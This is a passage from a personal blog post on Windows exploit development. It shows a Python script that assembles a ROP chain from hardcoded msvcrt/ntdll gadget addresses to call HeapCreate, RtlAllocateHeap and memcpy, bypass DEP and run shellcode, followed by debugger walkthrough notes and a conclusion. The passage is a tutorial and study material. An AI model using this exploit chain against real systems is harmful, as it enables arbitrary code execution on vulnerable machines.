    #rop3 += b'3' * 0x10
    rop3 += b'3333'
    rop3 += b'3333'
    rop3 += add_esp_3c
    rop3 += b'3333'
    rop3 += b'3333' # pop ebp

    # call RtlAllocateHeap
    rop4 = b''
    rop4 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    #rop4 += b'4444' # pop ebp
    rop4 += add_esp_3c
    rop4 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x7eb9a9e3) # PUSH EAX # SUB AL,8B # DEC ECX # OR AL,1 # DEC EAX # POP ESP # POP EBP # RETN 0x08
    rop4 += b'4444' # pop ebp

    # set the first arg of memcpy
    rop5 = b''
    rop5 += p32(0x77c14001) # XCHG EAX,ECX # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += b'5555' # pop esi 
    rop5 += p32(0x7eb95689) # ADD EAX,10 # POP ESI # POP EBP # RETN 0x10    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += b'5555' # pop esi
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x77c1d7f5) # ADD EAX,20 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += b'5' * 0x10
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x77c1d7f5) # ADD EAX,20 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x77c1d7f5) # ADD EAX,20 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x77c1d7f5) # ADD EAX,20 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x77c1d7f5) # ADD EAX,20 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x77c1d7f5) # ADD EAX,20 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x77c1d7f5) # ADD EAX,20 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop5 += b'5555'
    rop5 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop5 += b'5555'
    rop5 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop5 += b'5555'
    rop5 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop5 += b'5555'
    rop5 += p32(0x7eba5686) # MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += b'5555' # pop ebp

    # the second parameter of memcpy, saving src (edi+0x140) to [edi+0x34]
    rop5 += p32(0x77c14001) # XCHG EAX,ECX # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += b'5555' # pop esi
    rop5 += p32(0x7eba556e) # ADD EAX,100 # POP EBP # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x7eba556e) # ADD EAX,100 # POP EBP # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x7eba5560) # ADD EAX,40 # POP EBP # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x77c14001) # XCHG EAX,ECX # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += b'5555' # retn 0x04
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x7eba5686) # MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop5 += b'5555' # retn 0x04
    rop5 += b'5555' # pop ebp

    rop6 = b''
    rop6 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop6 += b'6666' # pop esi
    rop6 += p32(0x77c1c8f0) # ADD EAX,20 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop6 += b'6666' # pop ebp
    rop6 += p32(0x77c1c8f0) # ADD EAX,20 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop6 += b'6666' # pop ebp
    rop6 += p32(0x77c1c8f0) # ADD EAX,20 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop6 += b'6666' # pop ebp
    rop6 += p32(0x77c1c8f0) # ADD EAX,20 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop6 += b'6666' # pop ebp
    rop6 += p32(0x77c1c8f0) # ADD EAX,20 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop6 += b'6666' # pop ebp
    rop6 += p32(0x77c1c8f0) # ADD EAX,20 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop6 += b'6666' # pop ebp
    rop6 += p32(0x77c1c8f0) # ADD EAX,20 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop6 += b'6666' # pop ebp
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += b'6666' # pop ebp
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += b'6666' # pop ebp
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += b'6666' # pop ebp
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += b'6666' # pop ebp
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += b'6666' # pop ebp
    rop6 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop6 += b'6666' # pop ebp
    rop6 += p32(0x7eb9a9e3) # PUSH EAX # SUB AL,8B # DEC ECX # OR AL,1 # DEC EAX # POP ESP # POP EBP # RETN 0x08
    rop6 += b'6666' # pop ebp
    # retn 0x08 left

    #shellcode = read_shellcode()
    shellcode = read_shellcode()

    padding_A = b'A' * 0x8c
    #padding_A = b'A' * 2060
    padding_B = b'B' * 0x1c4
    padding_C = b'C' * 0x08
    padding_H = b'H' * 0x04
    padding_D = b'D' * 0x08
    padding_I = b'I' * 0x04
    addr_heapcreate = p32(0x7c812871)
    hc_arg1 = p32(0x00040000)
    hc_arg2 = p32(0x180)
    hc_arg3 = p32(0x180)
    addr_rtlallocateheap = p32(0x7eb400c4)
    ah_arg2 = p32(0x8)
    ah_arg3 = p32(0x180)
    addr_memcpy = p32(0x7eb31db3)
    m_arg1_2 = p32(0) * 2
    m_arg3 = p32(0x180)
    padding_E = b'E' * 0x5c
    jmp_eax = p32(0x7c85f1bc) # jmp eax
    nops = b'\x90' * 16

    exploit = b''
    exploit += padding_A
    exploit += rop1
    exploit += rop2
    exploit += padding_B
    exploit += addr_heapcreate # kernel32!HeapCreate
    exploit += padding_C
    exploit += add_esp_1c
    exploit += hc_arg1
    exploit += hc_arg2
    exploit += hc_arg3
    #exploit += b'E' * 4
    exploit += addr_rtlallocateheap # ntdll!RtlAllocateHeap
    exploit += padding_D
    exploit += add_esp_3c
    exploit += b'E' * 4
    exploit += ah_arg2
    exploit += ah_arg3
    exploit += rop3
    exploit += rop4
    exploit += addr_memcpy # ntdll!memcpy
    exploit += padding_I
    exploit += padding_I
    exploit += jmp_eax
    exploit += m_arg1_2
    exploit += m_arg3
    #exploit += padding_I
    exploit += rop5
    exploit += rop6
    exploit += nops
    exploit += shellcode

    return exploit

def main():
    exploit = sixth_sword()

    with open('exploit_dep.txt', 'wb') as f:
        f.write(exploit)

    print('[+] OK')

if __name__ == '__main__':
    main()
```

Now, let’s try to exploit it!

We can see that the parameters have been successfully passed to `HeapCreate`.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/59c2f5b20e26a2e5.png)

The parameters of `RtlAllocateHeap` have also been configured successfully.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/7f31cc1d3b212927.png)

After calling `RtlAllocateHeap`, the memory dump shows that we have zeroed out the target memory region.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/4bc98aa0cbdc8aa0.png)

Next, the parameters of `memcpy` have been configured successfully.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d8f9f54281e92498.png)

After calling `memcpy`, the shellcode has been copied into the target memory region.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/ab3c4a546e8e2214.png)

Finally, we can execute the shellcode successfully!

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/a1299f19590397b7.png)

> **Note:** I used a `calc.exe` payload because the message box payload was too large. It overwrote some important data and caused the exploit to fail.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/6b0e10552622f39a.png)

## Conclusion

This will probably be the last article in which I introduce methods for bypassing DEP. Of course, this definitely won’t be the last article in this series!

Over the past few days, I’ve learned how to build a ROP chain from scratch and use it to bypass DEP. This is also the last topic covered in my textbook. Therefore, I’ll move on to other exploitation techniques and document what I learn in future posts.

That’s it for this article! If you have any comments or suggestions, feel free to leave them below!

## THANKS FOR READING

I drew a [new drawing](https://www.pixiv.net/artworks/150596763)!

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/477b6e77a640ff28.jpg)
